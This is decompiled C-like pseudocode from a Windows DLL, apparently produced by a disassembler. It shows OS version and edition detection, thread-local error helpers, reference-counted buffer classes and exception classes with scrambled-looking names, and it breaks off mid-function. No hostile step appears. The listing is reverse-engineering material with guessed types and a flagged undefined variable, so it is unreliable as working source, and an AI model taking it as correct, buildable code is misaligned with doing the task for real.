char __usercall sub_10016052@<al>(int *a1@<edx>, _DWORD *a2@<ecx>, int *a3@<edi>)
{
  bool v6; // zf
  DWORD v7; // eax
  DWORD v8; // eax
  DWORD v9; // eax
  int v10; // esi
  int v11; // eax
  int v12; // esi
  int v13; // [esp+8h] [ebp-9Ch] BYREF
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-98h] BYREF

  *a3 = 0;
  *a1 = 0;
  VersionInformation.dwOSVersionInfoSize = 148;
  if ( !GetVersionExA(&VersionInformation) )
    return 0;
  if ( VersionInformation.dwPlatformId == 1 )
  {
    v11 = 0;
    v6 = VersionInformation.dwMajorVersion == 4;
    *a2 = 0;
    if ( v6 )
    {
      switch ( VersionInformation.dwMinorVersion )
      {
        case 0u:
          *a3 = 1;
          return 1;
        case 0xAu:
          *a3 = 2;
          return 1;
        case 0x5Au:
          *a3 = 3;
          return 1;
      }
    }
    goto LABEL_21;
  }
  if ( VersionInformation.dwPlatformId != 2 )
    return 0;
  v7 = VersionInformation.dwMajorVersion - 3;
  v6 = VersionInformation.dwMajorVersion == 3;
  *a2 = 1;
  if ( v6 )
  {
    *a3 = 4;
    return 1;
  }
  v8 = v7 - 1;
  if ( !v8 )
  {
    *a3 = 5;
    return 1;
  }
  v9 = v8 - 1;
  if ( !v9 )
  {
    if ( sub_10016009(a1) )
    {
      switch ( VersionInformation.dwMinorVersion )
      {
        case 0u:
          *a3 = 6;
          return 1;
        case 1u:
          *a3 = 7;
          return 1;
        case 2u:
          *a3 = 8;
          return 1;
      }
      goto LABEL_9;
    }
    return 0;
  }
  if ( v9 == 1 )
  {
    v13 = 0;
    if ( sub_10016262(&v13) )
    {
      if ( v13 == 1 )
      {
        *a3 = 11;
        return 1;
      }
      if ( v13 == 2 )
      {
        *a3 = 0;
        return 1;
      }
      if ( sub_10016009(a1) )
      {
        if ( VersionInformation.dwMinorVersion )
        {
          if ( VersionInformation.dwMinorVersion != 1 )
            goto LABEL_9;
          v10 = *a1;
          if ( v10 == 1 )
          {
            *a3 = 13;
            return 1;
          }
          v11 = (unsigned int)(v10 - 2) > 1 ? 0 : 12;
        }
        else
        {
          v12 = *a1;
          if ( v12 == 1 )
          {
            *a3 = 9;
            return 1;
          }
          v11 = (unsigned int)(v12 - 2) > 1 ? 0 : 10;
        }
LABEL_21:
        *a3 = v11;
        return 1;
      }
    }
    return 0;
  }
LABEL_9:
  *a3 = 0;
  return 1;
}

//----- (10016206) --------------------------------------------------------
void sub_10016206()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-18h] BYREF
  int v1; // [esp+Ch] [ebp-Ch] BYREF
  int v2; // [esp+10h] [ebp-8h] BYREF
  int v3; // [esp+14h] [ebp-4h] BYREF

  if ( byte_100B7027 )
  {
    if ( !sub_10016052(&v1, &v2, &v3) )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    dword_100B7DF0 = v3;
    dword_100B7DF4 = v2;
    dword_100B7DF8 = v1;
    byte_100B7027 = 0;
  }
}
// 100B7027: using guessed type char byte_100B7027;
// 100B7DF0: using guessed type int dword_100B7DF0;
// 100B7DF4: using guessed type int dword_100B7DF4;
// 100B7DF8: using guessed type int dword_100B7DF8;
// 10016206: using guessed type _DWORD pExceptionObject[3];

//----- (10016262) --------------------------------------------------------
char __usercall sub_10016262@<al>(_DWORD *a1@<ebx>)
{
  HMODULE ModuleHandleW; // eax
  BOOL (__stdcall *GetProductInfo)(DWORD, DWORD, DWORD, DWORD, PDWORD); // eax
  int v4; // eax
  int v5; // [esp+0h] [ebp-A4h] BYREF
  _BYTE VersionInformation[156]; // [esp+4h] [ebp-A0h] BYREF

  v5 = 0;
  *a1 = 0;
  memset(VersionInformation, 0, sizeof(VersionInformation));
  *(_DWORD *)VersionInformation = 156;
  if ( !GetVersionExA((LPOSVERSIONINFOA)VersionInformation) )
    return 0;
  ModuleHandleW = GetModuleHandleW(ModuleName);
  if ( !ModuleHandleW )
    return 0;
  GetProductInfo = (BOOL (__stdcall *)(DWORD, DWORD, DWORD, DWORD, PDWORD))GetProcAddress(ModuleHandleW, ProcName);
  if ( !GetProductInfo
    || !GetProductInfo(
          *(_DWORD *)&VersionInformation[4],
          *(_DWORD *)&VersionInformation[8],
          *(unsigned __int16 *)&VersionInformation[148],
          *(unsigned __int16 *)&VersionInformation[150],
          (PDWORD)&v5) )
  {
    return 0;
  }
  v4 = v5;
  if ( v5 == -1412584499 || !v5 )
    *a1 = 2;
  if ( v4 == 12 || v4 == 14 || v4 == 13 || v4 == 39 || v4 == 41 || v4 == 40 || v4 == 29 )
    *a1 = 1;
  return 1;
}

//----- (10016377) --------------------------------------------------------
LONG __usercall sub_10016377@<eax>(int a1@<esi>)
{
  LONG result; // eax

  result = InterlockedDecrement((volatile LONG *)(a1 + 4));
  if ( !result )
  {
    if ( a1 )
      return (**(int (__thiscall ***)(int, int))a1)(a1, 1);
  }
  return result;
}

//----- (100163AB) --------------------------------------------------------
LPVOID sub_100163AB()
{
  DWORD LastError; // edi
  LPVOID Value; // eax
  LPVOID v2; // esi

  LastError = GetLastError();
  Value = TlsGetValue(dwTlsIndex);
  if ( !Value )
    Value = (LPVOID)sub_1002A28C();
  v2 = Value;
  SetLastError(LastError);
  return v2;
}

//----- (100163D8) --------------------------------------------------------
void __cdecl sub_100163D8(LPVOID lpTlsValue)
{
  DWORD LastError; // esi

  LastError = GetLastError();
  if ( !TlsSetValue(dwTlsIndex, lpTlsValue) )
    sub_1002A2B8();
  SetLastError(LastError);
}
// 1002A2B8: using guessed type void __noreturn sub_1002A2B8(void);

//----- (10016406) --------------------------------------------------------
_DWORD *__thiscall sub_10016406(_DWORD *this, int a2)
{
  char *v3; // eax

  *this = &off_10093D0C;
  v3 = (char *)sub_100163AB();
  sub_100163D8(v3 + 1);
  return this;
}
// 10093D0C: using guessed type int (__thiscall *off_10093D0C)(void *Block, char);

//----- (10016422) --------------------------------------------------------
_DWORD *__thiscall sub_10016422(_DWORD *Block, char a2)
{
  sub_1001646C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10016441) --------------------------------------------------------
_DWORD *__thiscall sub_10016441(_DWORD *this)
{
  DWORD LastError; // edi
  char *v3; // eax

  *this = &off_10093D0C;
  LastError = GetLastError();
  v3 = (char *)sub_100163AB();
  sub_100163D8(v3 + 1);
  SetLastError(LastError);
  return this;
}
// 10093D0C: using guessed type int (__thiscall *off_10093D0C)(void *Block, char);

//----- (1001646C) --------------------------------------------------------
void __thiscall sub_1001646C(_DWORD *this)
{
  int v1; // eax

  *this = &off_10093D0C;
  v1 = sub_100163AB();
  sub_100163D8((LPVOID)(v1 - 1));
}
// 100163AB: using guessed type int sub_100163AB(void);
// 10093D0C: using guessed type int (__thiscall *off_10093D0C)(void *Block, char);

//----- (100164A8) --------------------------------------------------------
_DWORD *__stdcall sub_100164A8(_DWORD *a1, int a2)
{
  sub_10016441(a1);
  *a1 = &off_10093D1C;
  a1[1] = a2;
  return a1;
}
// 10093D1C: using guessed type int (__thiscall *off_10093D1C)(void *Block, char);

//----- (100164DC) --------------------------------------------------------
_DWORD *__thiscall sub_100164DC(_DWORD *Block, char a2)
{
  sub_100164FB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100164FB) --------------------------------------------------------
void __thiscall sub_100164FB(_DWORD *this)
{
  *this = &off_10093D1C;
  sub_1001646C(this);
}
// 10093D1C: using guessed type int (__thiscall *off_10093D1C)(void *Block, char);

//----- (1001651F) --------------------------------------------------------
_DWORD *__stdcall sub_1001651F(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093D14;
  return a1;
}
// 10093D14: using guessed type int (__thiscall *off_10093D14)(void *Block, char);

//----- (1001654D) --------------------------------------------------------
_DWORD *__thiscall sub_1001654D(_DWORD *Block, char a2)
{
  sub_1001656C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001656C) --------------------------------------------------------
void __thiscall sub_1001656C(_DWORD *this)
{
  *this = &off_10093D14;
  sub_1001646C(this);
}
// 10093D14: using guessed type int (__thiscall *off_10093D14)(void *Block, char);

//----- (10016590) --------------------------------------------------------
_DWORD *__stdcall sub_10016590(_DWORD *a1)
{
  *a1 = &unk_1009397C;
  sub_10016441(a1 + 1);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093974;
  return a1;
}
// 10093974: using guessed type int (__stdcall *off_10093974)(char);

//----- (100165E5) --------------------------------------------------------
_DWORD *__stdcall sub_100165E5(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093C2C;
  return a1;
}
// 10093C2C: using guessed type int (__thiscall *off_10093C2C)(void *Block, char);

//----- (10016613) --------------------------------------------------------
void __thiscall sub_10016613(_DWORD *this)
{
  *this = &off_10093C2C;
  sub_1001646C(this);
}
// 10093C2C: using guessed type int (__thiscall *off_10093C2C)(void *Block, char);

//----- (10016637) --------------------------------------------------------
_DWORD *__stdcall sub_10016637(_DWORD *a1, int a2)
{
  sub_10016441(a1);
  *a1 = &off_10093964;
  a1[1] = a2;
  return a1;
}
// 10093964: using guessed type int (__thiscall *off_10093964)(void *Block, char);

//----- (1001666B) --------------------------------------------------------
void __thiscall sub_1001666B(_DWORD *this)
{
  *this = &off_10093964;
  sub_1001646C(this);
}
// 10093964: using guessed type int (__thiscall *off_10093964)(void *Block, char);

//----- (1001668F) --------------------------------------------------------
_DWORD *__stdcall sub_1001668F(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10092F18;
  return a1;
}
// 10092F18: using guessed type int (__thiscall *off_10092F18)(void *Block, char);

//----- (100166BD) --------------------------------------------------------
void __thiscall sub_100166BD(_DWORD *this)
{
  *this = &off_10092F18;
  sub_1001646C(this);
}
// 10092F18: using guessed type int (__thiscall *off_10092F18)(void *Block, char);

//----- (100166E1) --------------------------------------------------------
_DWORD *__stdcall sub_100166E1(_DWORD *a1)
{
  *a1 = &unk_10093578;
  sub_10016441(a1 + 1);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093570;
  return a1;
}
// 10093570: using guessed type int (__stdcall *off_10093570)(char);

//----- (10016736) --------------------------------------------------------
_DWORD *__stdcall sub_10016736(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093C48;
  return a1;
}
// 10093C48: using guessed type int (__thiscall *off_10093C48)(void *Block, char);

//----- (10016764) --------------------------------------------------------
void __thiscall sub_10016764(_DWORD *this)
{
  *this = &off_10093C48;
  sub_1001646C(this);
}
// 10093C48: using guessed type int (__thiscall *off_10093C48)(void *Block, char);

//----- (10016788) --------------------------------------------------------
_DWORD *__stdcall sub_10016788(_DWORD *a1, int a2)
{
  sub_10016441(a1);
  *a1 = &off_10093D24;
  a1[1] = a2;
  return a1;
}
// 10093D24: using guessed type int (__thiscall *off_10093D24)(void *Block, char);

//----- (100167BC) --------------------------------------------------------
_DWORD *__thiscall sub_100167BC(_DWORD *Block, char a2)
{
  sub_100167DB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100167DB) --------------------------------------------------------
void __thiscall sub_100167DB(_DWORD *this)
{
  sub_1001646C(this);
}

//----- (100167F9) --------------------------------------------------------
_DWORD *__thiscall sub_100167F9(_DWORD *this, int a2)
{
  if ( a2 )
  {
    *this = &unk_10093634;
    sub_10016441(this + 2);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_1009362C;
  this[1] = GetLastError();
  return this;
}
// 10016441: using guessed type int __thiscall sub_10016441(_DWORD);
// 1009362C: using guessed type int (__stdcall *off_1009362C)(char);

//----- (1001685F) --------------------------------------------------------
int __stdcall sub_1001685F(int a1, void *a2, void *a3)
{
  *(_DWORD *)a1 = &off_10093D08;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = off_10093D30;
  sub_10016952(a2, a1, a3);
  return a1;
}
// 10093D08: using guessed type void (__noreturn *off_10093D08)();
// 10093D30: using guessed type int (__thiscall *off_10093D30[2])(void *Block, char);

//----- (1001689F) --------------------------------------------------------
void *__thiscall sub_1001689F(void *Block, char a2)
{
  sub_10016902((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100168BF) --------------------------------------------------------
int __stdcall sub_100168BF(int a1, int a2)
{
  *(_DWORD *)a1 = &off_10093D08;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = off_10093D30;
  sub_10016952(*(void **)(a2 + 16), a1, *(void **)(a2 + 12));
  return a1;
}
// 10093D08: using guessed type void (__noreturn *off_10093D08)();
// 10093D30: using guessed type int (__thiscall *off_10093D30[2])(void *Block, char);

//----- (10016902) --------------------------------------------------------
void __stdcall sub_10016902(int a1)
{
  *(_DWORD *)a1 = off_10093D30;
  if ( *(_DWORD *)(a1 + 12) )
    j__free(*(void **)(a1 + 12));
  *(_DWORD *)a1 = &off_10093D08;
}
// 10093D08: using guessed type void (__noreturn *off_10093D08)();
// 10093D30: using guessed type int (__thiscall *off_10093D30[2])(void *Block, char);

//----- (10016952) --------------------------------------------------------
void *__userpurge sub_10016952@<eax>(void *result@<eax>, int a2@<esi>, void *Src)
{
  *(_DWORD *)(a2 + 12) = 0;
  *(_DWORD *)(a2 + 16) = result;
  if ( result )
  {
    result = operator new((size_t)result);
    *(_DWORD *)(a2 + 12) = result;
    if ( Src )
      return memcpy(result, Src, *(_DWORD *)(a2 + 16));
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10016983) --------------------------------------------------------
int __userpurge sub_10016983@<eax>(void *a1@<ebx>, int a2, void *a3)
{
  void *v3; // eax
  int v4; // eax

  *(_DWORD *)a2 = off_10093D2C;
  v3 = operator new(0x14u);
  if ( v3 )
    v4 = sub_1001685F((int)v3, a1, a3);
  else
    v4 = 0;
  *(_DWORD *)(a2 + 4) = v4;
  sub_10016FCA((int *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = a1;
  *(_BYTE *)(a2 + 16) = 0;
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093D2C: using guessed type int (__thiscall *off_10093D2C[3])(void *Block, char);

//----- (100169E9) --------------------------------------------------------
int *__thiscall sub_100169E9(int *Block, char a2)
{
  sub_10016B53(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10016A08) --------------------------------------------------------
int __userpurge sub_10016A08@<eax>(int a1@<ebx>, int a2)
{
  int v2; // eax
  size_t v3; // eax
  void *v5; // [esp-4h] [ebp-24h]
  void *Block; // [esp+10h] [ebp-10h]

  *(_DWORD *)a2 = off_10093D2C;
  Block = operator new(0x14u);
  v2 = 0;
  if ( Block )
  {
    v5 = *(void **)(*(_DWORD *)(a1 + 4) + 12);
    v3 = sub_1000D0EE(a1);
    v2 = sub_1001685F((int)Block, (void *)(2 * v3), v5);
  }
  *(_DWORD *)(a2 + 4) = v2;
  sub_10016FCA((int *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = 2 * sub_1000D0EE(a1);
  *(_BYTE *)(a2 + 16) = 0;
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093D2C: using guessed type int (__thiscall *off_10093D2C[3])(void *Block, char);

//----- (10016A83) --------------------------------------------------------
int __userpurge sub_10016A83@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4, void *pExceptionObject)
{
  char v5; // cl
  void *v7; // [esp-4h] [ebp-20h]

  v7 = pExceptionObject;
  *(_DWORD *)a3 = off_10093D2C;
  sub_10016F42(a2 + 1, (int *)(a3 + 4), v7);
  *(_DWORD *)(a3 + 8) = a4 + a2[2];
  v5 = (char)pExceptionObject;
  *(_DWORD *)(a3 + 12) = a1;
  *(_BYTE *)(a3 + 16) = v5;
  if ( a1 + a4 > (unsigned int)a2[3] )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return a3;
}
// 10093D2C: using guessed type int (__thiscall *off_10093D2C[3])(void *Block, char);

//----- (10016AE9) --------------------------------------------------------
int __userpurge sub_10016AE9@<eax>(_DWORD *a1@<ebx>, int a2)
{
  *(_DWORD *)a2 = off_10093D2C;
  *(_DWORD *)(a2 + 4) = a1[1];
  sub_10016FCA((int *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = a1[2];
  *(_DWORD *)(a2 + 12) = a1[3];
  *(_BYTE *)(a2 + 16) = 0;
  return a2;
}
// 10093D2C: using guessed type int (__thiscall *off_10093D2C[3])(void *Block, char);

//----- (10016B2F) --------------------------------------------------------
int __usercall sub_10016B2F@<eax>(int *a1@<ebx>, int a2@<esi>)
{
  if ( a1 != (int *)a2 )
  {
    sub_10016F9F(a1 + 1, (int *)(a2 + 4));
    *(_DWORD *)(a2 + 8) = a1[2];
    *(_DWORD *)(a2 + 12) = a1[3];
    *(_BYTE *)(a2 + 16) = 0;
  }
  return a2;
}

//----- (10016B53) --------------------------------------------------------
LONG __thiscall sub_10016B53(int *this)
{
  *this = (int)off_10093D2C;
  return sub_10016F6B(this + 1);
}
// 10093D2C: using guessed type int (__thiscall *off_10093D2C[3])(void *Block, char);

//----- (10016B7B) --------------------------------------------------------
void __usercall sub_10016B7B(int a1@<ebx>)
{
  int *v1; // edi
  void *v2; // eax
  void *Block[3]; // [esp+10h] [ebp-10h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  if ( !*(_BYTE *)(a1 + 16) )
  {
    v1 = (int *)(a1 + 4);
    if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) > 1u )
    {
      Block[0] = operator new(0x14u);
      v4 = 0;
      if ( Block[0] )
        v2 = (void *)sub_1001685F(
                       (int)Block[0],
                       *(void **)(a1 + 12),
                       (void *)(*(_DWORD *)(a1 + 8) + *(_DWORD *)(*v1 + 12)));
      else
        v2 = 0;
      v4 = -1;
      Block[0] = v2;
      sub_10016FCA((int *)Block, 0);
      v4 = 1;
      sub_10016F9F((int *)Block, v1);
      v4 = -1;
      sub_10016F6B((int *)Block);
      *(_DWORD *)(a1 + 8) = 0;
    }
    *(_BYTE *)(*v1 + 8) = 0;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10016C00) --------------------------------------------------------
int __usercall sub_10016C00@<eax>(_DWORD *a1@<eax>)
{
  if ( !a1[3] )
    return 0;
  sub_10016B7B((int)a1);
  return a1[2] + *(_DWORD *)(a1[1] + 12);
}

//----- (10016C24) --------------------------------------------------------
int __thiscall sub_10016C24(_DWORD *this)
{
  if ( this[3] )
    return this[2] + *(_DWORD *)(this[1] + 12);
  else
    return 0;
}

//----- (10016C51) --------------------------------------------------------
int __userpurge sub_10016C51@<eax>(int a1@<eax>, int a2)
{
  sub_10016B7B(a1);
  return a2 + *(_DWORD *)(a1 + 8) + *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12);
}

//----- (10016C6D) --------------------------------------------------------
bool __fastcall sub_10016C6D(_DWORD *a1, _DWORD *a2)
{
  size_t v2; // eax
  int v4; // eax
  int v5; // esi
  int v6; // ecx
  int v7; // edx
  size_t Size; // [esp+0h] [ebp-4h]

  v2 = a2[3];
  Size = v2;
  if ( v2 != a1[3] )
    return 0;
  if ( !v2 )
    return 1;
  v4 = a1[1];
  v5 = a1[2];
  v6 = a2[1];
  v7 = a2[2];
  return v7 + *(_DWORD *)(v6 + 12) == v5 + *(_DWORD *)(v4 + 12)
      || memcmp((const void *)(v7 + *(_DWORD *)(v6 + 12)), (const void *)(v5 + *(_DWORD *)(v4 + 12)), Size) == 0;
}

//----- (10016CD5) --------------------------------------------------------
int __thiscall sub_10016CD5(_DWORD *this, int a2)
{
  void *v3; // ebx
  void *v4; // eax
  void *v5; // ebx
  void *v6; // eax
  void *v7; // eax
  void *v8; // eax
  const void *v9; // eax
  int v10; // edx
  int v11; // edi
  const void *v12; // eax
  size_t v14; // [esp-4h] [ebp-4Ch]
  size_t v15; // [esp-4h] [ebp-4Ch]
  int v16[5]; // [esp+10h] [ebp-38h] BYREF
  int v17[3]; // [esp+24h] [ebp-24h] BYREF
  size_t Size; // [esp+30h] [ebp-18h]
  void *Block[3]; // [esp+38h] [ebp-10h] BYREF
  int v20; // [esp+44h] [ebp-4h]

  v3 = *(void **)(a2 + 12);
  v4 = (void *)sub_10016C24((_DWORD *)a2);
  sub_10016983(v3, (int)v17, v4);
  v20 = 0;
  v5 = (void *)this[3];
  v6 = (void *)sub_10016C24(this);
  sub_10016983(v5, (int)v16, v6);
  LOBYTE(v20) = 1;
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) += this[3];
  v7 = operator new(0x14u);
  Block[0] = v7;
  LOBYTE(v20) = 2;
  if ( v7 )
    v8 = (void *)sub_1001685F((int)v7, *(void **)(a2 + 12), 0);
  else
    v8 = 0;
  LOBYTE(v20) = 1;
  Block[0] = v8;
  sub_10016FCA((int *)Block, 0);
  LOBYTE(v20) = 3;
  sub_10016F9F((int *)Block, (int *)(a2 + 4));
  LOBYTE(v20) = 1;
  sub_10016F6B((int *)Block);
  v14 = Size;
  v9 = (const void *)sub_10016C24(v17);
  memcpy(*(void **)(v10 + 12), v9, v14);
  v11 = *(_DWORD *)(a2 + 4);
  v15 = v16[3];
  v12 = (const void *)sub_10016C24(v16);
  memcpy((void *)(Size + *(_DWORD *)(v11 + 12)), v12, v15);
  LOBYTE(v20) = 0;
  sub_10016B53(v16);
  v20 = -1;
  sub_10016B53(v17);
  return a2;
}
// 10016D7A: variable 'v10' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10016CD5: using guessed type int var_24[3];

//----- (10016DC4) --------------------------------------------------------
int __usercall sub_10016DC4@<eax>(_DWORD *a1@<ebx>, int a2, _DWORD *a3)
{
  sub_10016AE9(a1, a2);
  sub_10016CD5(a3, a2);
  return a2;
}

//----- (10016DFF) --------------------------------------------------------
int __userpurge sub_10016DFF@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4)
{
  sub_10016A83(a1, a2, a3, a4, 0);
  return a3;
}

//----- (10016E32) --------------------------------------------------------
int __userpurge sub_10016E32@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4)
{
  sub_10016A83(a1, a2, a3, a4, (void *)1);
  return a3;
}

//----- (10016E72) --------------------------------------------------------
int __thiscall sub_10016E72(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = sub_10016C24(this);
  memcpy(&a2, (const void *)(a2 + v2), sizeof(a2));
  return a2;
}

//----- (10016E93) --------------------------------------------------------
_BYTE *__userpurge sub_10016E93@<eax>(_DWORD *a1@<esi>, int a2, int Src)
{
  char v3; // bl
  int v4; // eax
  _BYTE *result; // eax

  v3 = *(_BYTE *)(a1[1] + 8);
  v4 = sub_10016C00(a1);
  result = memcpy((void *)(a2 + v4), &Src, 4u);
  if ( v3 )
  {
    result = (_BYTE *)a1[1];
    result[8] = 1;
  }
  return result;
}

//----- (10016EC6) --------------------------------------------------------
__int16 __thiscall sub_10016EC6(_DWORD *this)
{
  const void *v1; // eax
  _DWORD *v3; // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  v1 = (const void *)sub_10016C24(this);
  memcpy(&v3, v1, 2u);
  return (__int16)v3;
}

//----- (10016EE4) --------------------------------------------------------
_BYTE *__userpurge sub_10016EE4@<eax>(_DWORD *a1@<esi>, __int16 Src)
{
  char v2; // bl
  void *v3; // eax
  _BYTE *result; // eax

  v2 = *(_BYTE *)(a1[1] + 8);
  v3 = (void *)sub_10016C00(a1);
  result = memcpy(v3, &Src, 2u);
  if ( v2 )
  {
    result = (_BYTE *)a1[1];
    result[8] = 1;
  }
  return result;
}

//----- (10016F14) --------------------------------------------------------
_BYTE *__usercall sub_10016F14@<eax>(_DWORD *a1@<esi>)
{
  char v1; // bl
  _BYTE *result; // eax
  void *v3; // eax
  size_t v4; // [esp-4h] [ebp-8h]

  v1 = *(_BYTE *)(a1[1] + 8);
  result = (_BYTE *)a1[3];
  if ( result )
  {
    v4 = a1[3];
    v3 = (void *)sub_10016C00(a1);
    result = memset(v3, 0, v4);
  }
  if ( v1 )
  {
    result = (_BYTE *)a1[1];
    result[8] = 1;
  }
  return result;
}

//----- (10016F42) --------------------------------------------------------
int *__userpurge sub_10016F42@<eax>(int *a1@<eax>, int *a2@<ecx>, void *a3)
{
  *a2 = *a1;
  sub_10016FCA(a2, a3);
  return a2;
}

//----- (10016F6B) --------------------------------------------------------
LONG __stdcall sub_10016F6B(int *a1)
{
  LONG result; // eax

  result = (LONG)a1;
  if ( *a1 )
    return sub_10016377(*a1);
  return result;
}

//----- (10016F9F) --------------------------------------------------------
int *__usercall sub_10016F9F@<eax>(int *a1@<eax>, int *a2@<edi>)
{
  int v2; // eax
  int v3; // ebx

  v2 = *a1;
  v3 = *a2;
  if ( *a2 != v2 )
  {
    *a2 = v2;
    sub_10016FCA(a2, 0);
    if ( v3 )
      sub_10016377(v3);
  }
  return a2;
}

//----- (10016FCA) --------------------------------------------------------
LONG __userpurge sub_10016FCA@<eax>(int *a1@<esi>, void *Block)
{
  LONG result; // eax
  void *v3; // eax
  int v4; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) && !(_BYTE)Block )
    {
      v3 = operator new(0x14u);
      if ( v3 )
        v4 = sub_100168BF((int)v3, *a1);
      else
        v4 = 0;
      *a1 = v4;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10017031) --------------------------------------------------------
_DWORD *__thiscall sub_10017031(_DWORD *Block, char a2)
{
  *Block = &off_10093D34;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);

//----- (10017063) --------------------------------------------------------
int __usercall sub_10017063@<eax>(int a1@<esi>)
{
  _BYTE *v1; // eax

  v1 = sub_1001DB4C();
  if ( !*(_BYTE *)(a1 + 8) && v1 && v1[96] )
    *(_BYTE *)(a1 + 9) = 1;
  --*(_DWORD *)(a1 + 4);
  return (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 12))(a1);
}

//----- (10017087) --------------------------------------------------------
int __usercall sub_10017087@<eax>(int *a1@<esi>)
{
  int v1; // eax
  int result; // eax
  _BYTE *v3; // eax
  int v4; // [esp+0h] [ebp-8h] BYREF
  int pExceptionObject; // [esp+4h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int *))(*a1 + 4))(a1) )
  {
    sub_1002A2DB(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
  }
  (*(void (__thiscall **)(int *))(*a1 + 8))(a1);
  v1 = *a1;
  ++a1[1];
  result = (*(int (__thiscall **)(int *))(v1 + 4))(a1);
  if ( (_BYTE)result )
  {
    (*(void (__thiscall **)(int *))(*a1 + 12))(a1);
    sub_1002A2DB(&v4);
    _CxxThrowException(&v4, (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
  }
  if ( a1[1] == 1 )
  {
    v3 = sub_1001DB4C();
    result = v3 && v3[96];
    *((_BYTE *)a1 + 8) = result;
  }
  return result;
}

//----- (1001714F) --------------------------------------------------------
char __thiscall sub_1001714F(_BYTE *this)
{
  return this[9];
}

//----- (1001716D) --------------------------------------------------------
_DWORD *__thiscall sub_1001716D(_DWORD *Block, char a2)
{
  sub_1001718C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001718C) --------------------------------------------------------
int __thiscall sub_1001718C(_DWORD *this)
{
  *this = off_10093D44;
  return sub_10017063(this[1]);
}
// 10093D44: using guessed type int (__thiscall *off_10093D44[3])(void *Block, char);

//----- (100171BE) --------------------------------------------------------
_DWORD *__usercall sub_100171BE@<eax>(int *a1@<eax>, _DWORD *a2@<edi>)
{
  *a2 = off_10093D48;
  a2[1] = a1;
  sub_10017087(a1);
  return a2;
}
// 10093D48: using guessed type int (__thiscall *off_10093D48[2])(void *Block, char);

//----- (100171D3) --------------------------------------------------------
_DWORD *__thiscall sub_100171D3(_DWORD *Block, char a2)
{
  sub_100171F2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100171F2) --------------------------------------------------------
int __thiscall sub_100171F2(_DWORD *this)
{
  *this = off_10093D48;
  return sub_10017063(this[1]);
}
// 10093D48: using guessed type int (__thiscall *off_10093D48[2])(void *Block, char);

//----- (10017224) --------------------------------------------------------
int __stdcall sub_10017224(int a1)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  *(_DWORD *)a1 = &off_10093D34;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  v3 = 0;
  *(_DWORD *)a1 = &off_10093D78;
  sub_1000CC20(v2, &word_100B7DEC);
  LOBYTE(v3) = 1;
  sub_100140E1(v2, a1 + 12, 0, 0, 0);
  LOBYTE(v3) = 3;
  sub_1000CE59(v2);
  *(_DWORD *)(a1 + 28) = -1;
